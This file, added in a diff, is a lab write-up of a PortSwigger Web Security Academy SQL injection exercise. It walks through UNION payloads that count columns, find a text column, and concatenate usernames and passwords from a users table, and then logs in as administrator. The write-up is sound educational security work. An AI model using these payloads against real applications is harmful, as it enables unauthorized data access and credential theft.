@@ -1,0 +1,139 @@
+SQL Injection UNION Attack
+Retrieving Multiple Values in a Single Column
+
+==================================================
+
+1. ORIGINAL REQUEST
+   ==================================================
+
+GET /filter?category=Accessories HTTP/2
+
+==================================================
+2. DETERMINE NUMBER OF COLUMNS
+==============================
+
+Payload:
+
+' UNION SELECT NULL,NULL--
+
+Purpose:
+
+Determine the number of columns returned by the original SQL query.
+
+Result:
+
+2 columns identified.
+
+==================================================
+3. TEST FIRST COLUMN FOR TEXT
+=============================
+
+Payload:
+
+' UNION SELECT 'abc',NULL--
+
+Purpose:
+
+Determine whether the first UNION column accepts text.
+
+Result:
+
+Server-side error.
+
+==================================================
+4. TEST SECOND COLUMN FOR TEXT
+==============================
+
+Payload:
+
+' UNION SELECT NULL,'abc'--
+
+Purpose:
+
+Determine whether the second UNION column accepts text.
+
+Result:
+
+Successful.
+
+Finding:
+
+Second column is text-compatible.
+
+==================================================
+5. RETRIEVE MULTIPLE VALUES
+===========================
+
+Payload:
+
+' UNION SELECT NULL,username||'~'||password FROM users--
+
+Purpose:
+
+Retrieve the username and password fields from the users table through the single text-compatible column.
+
+String concatenation:
+
+username||'~'||password
+
+Output format:
+
+username~password
+
+==================================================
+6. DATA RETRIEVAL LOGIC
+=======================
+
+Original Query
+|
+v
+UNION SELECT
+|
++---- Column 1 = NULL
+|
++---- Column 2 = username||'~'||password
+|
+v
+users table
+|
+v
+username~password
+
+==================================================
+7. EXTRACTED ACCOUNTS
+=====================
+
+The response returned multiple accounts, including:
+
+wiener
+administrator
+carlos
+
+Actual password values are intentionally excluded from this public documentation.
+
+==================================================
+8. AUTHENTICATION
+=================
+
+The extracted administrator credentials were used to authenticate
+through the application's login functionality.
+
+Result:
+
+Authenticated as administrator.
+
+==================================================
+9. LAB RESULT
+=============
+
+LAB — Solved
+
+==================================================
+10. SECURITY NOTE
+=================
+
+These payloads were used exclusively against the authorized
+PortSwigger Web Security Academy laboratory environment.
+
+Do not use these payloads against systems without explicit
+authorization.
